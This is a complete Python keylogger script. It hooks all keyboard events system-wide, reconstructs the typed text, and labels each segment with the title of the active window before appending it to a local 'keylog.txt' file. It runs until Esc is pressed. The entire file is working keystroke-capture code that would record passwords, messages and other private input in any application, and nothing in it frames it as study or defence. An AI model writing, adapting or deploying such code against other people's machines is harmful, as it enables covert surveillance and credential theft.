import keyboard
import pygetwindow as gw
import time

# Function to get the title of the currently active window
def get_active_window_title():
    try:
        active_window = gw.getActiveWindow()
        if active_window:
            return active_window.title
        else:
            return None
    except Exception as e:
        print(f"Error getting active window: {e}")
        return None

# Function to handle key events and store them in a buffer
def handle_key(event, buffer):
    key = event.name

    # Special handling for certain keys
    if key == 'space':
        buffer.append(' ')  # Append actual space character
    elif key == 'enter':
        buffer.append('\n')  # Append newline character for enter
    elif key == 'backspace':
        if buffer:  # Remove the last character if there's anything in the buffer
            buffer.pop()
    elif key == 'tab':
        buffer.append('\t')  # Append tab character
    elif key not in ['shift', 'ctrl', 'alt', 'esc']:  # Ignore modifier keys
        buffer.append(key)  # Add normal key presses

# Open the file in append mode with utf-8 encoding
with open("keylog.txt", "a", encoding="utf-8") as file:
    print("Press keys... Press 'Esc' to stop.")

    # Initialize the current active window
    current_window = get_active_window_title()
    print(f"Active window: {current_window}")

    # Buffer to store key presses
    buffer = []

    # Listen to all key events
    while True:
        event = keyboard.read_event()

        # If a key is pressed
        if event.event_type == keyboard.KEY_DOWN:
            active_window = get_active_window_title()

            # If the active window has changed, write the buffer to the file
            if active_window != current_window:
                if buffer:  # Write the buffered keys if any exist
                    file.write(f"[{current_window}] {''.join(buffer)}\n")  # Join without spaces
                    buffer.clear()  # Clear the buffer after writing to file
                current_window = active_window
                print(f"Switched to active window: {current_window}")

            # Handle the key event (store in buffer)
            handle_key(event, buffer)

        # If the 'Esc' key is pressed, exit the loop and write the final buffer
        if keyboard.is_pressed('esc'):
            if buffer:  # Write any remaining buffered keys to file before exiting
                file.write(f"[{current_window}] {''.join(buffer)}\n")
            print("Exiting keylogger...")
            break

        # Sleep to reduce CPU usage
        time.sleep(0.01)
